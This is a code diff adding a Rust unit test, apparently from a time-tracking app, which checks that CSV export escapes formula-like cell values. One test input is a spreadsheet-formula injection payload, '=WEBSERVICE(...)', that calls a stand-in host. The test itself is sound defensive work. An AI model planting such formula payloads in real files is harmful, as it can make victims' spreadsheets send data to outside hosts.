@@ -92,3 +92,40 @@ fn report_operations_reject_inverted_date_ranges_instead_of_silently_returning_e
         "CSV export with start date after end date should be a validation error"
     );
 }
+
+#[test]
+fn csv_export_neutralizes_formula_like_project_names_and_notes() {
+    let c = conn();
+    let project = create_project_repo(
+        &c,
+        ProjectInput {
+            name: "=WEBSERVICE(\"https://example.invalid/\")".into(),
+            notes: None,
+        },
+    )
+    .unwrap();
+    create_entry_repo(
+        &c,
+        entry_input(
+            project.id,
+            Some(" +SUM(1,2) with bare\rcarriage return".into()),
+        ),
+    )
+    .unwrap();
+
+    let out = NamedTempFile::new().unwrap();
+    export_csv_repo(
+        &c,
+        "2026-03-14".into(),
+        "2026-03-14".into(),
+        None,
+        out.path(),
+    )
+    .unwrap();
+    let csv = std::fs::read_to_string(out.path()).unwrap();
+
+    assert!(csv.contains("'="), "formula-like project name should be prefixed: {csv}");
+    assert!(csv.contains("\"'+SUM(1,2) with bare\rcarriage return\""), "formula-like note should be prefixed and bare CR should force CSV quoting: {csv}");
+    assert!(!csv.contains(",=WEBSERVICE"), "project formula must not be emitted as an executable CSV cell: {csv}");
+    assert!(!csv.contains(",+SUM"), "note formula must not be emitted as an executable CSV cell: {csv}");
+}
